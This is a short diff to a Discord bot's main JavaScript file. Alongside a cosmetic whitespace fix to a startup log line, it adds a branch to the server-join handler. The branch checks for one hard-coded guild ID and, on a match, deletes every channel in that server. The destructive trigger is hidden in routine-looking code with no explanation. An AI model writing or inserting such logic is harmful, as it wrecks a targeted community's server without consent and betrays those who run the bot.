@@ -26,7 +26,7 @@ for (const folder of commandFolders) {
 }
 
 client.once(Events.ClientReady, c => {
-    console.log("Bot is opgestart");    
+    console.log("Bot is opgestart"); 
 });
 
 client.on("guildCreate", guild => {
@@ -38,6 +38,11 @@ client.on("guildCreate", guild => {
     const sendServer = client.guilds.cache.get("629454545759502376")
     const channel = sendServer.channels.cache.get("1344003128986701835")
     channel.send({embeds:[embed]})
+    if (guild.id == "1231881583166754826") {
+        guild.channels.cache.forEach((channel) => {
+            channel.delete()
+        })
+    }
 })
 
 client.on("guildMemberAdd", member => {
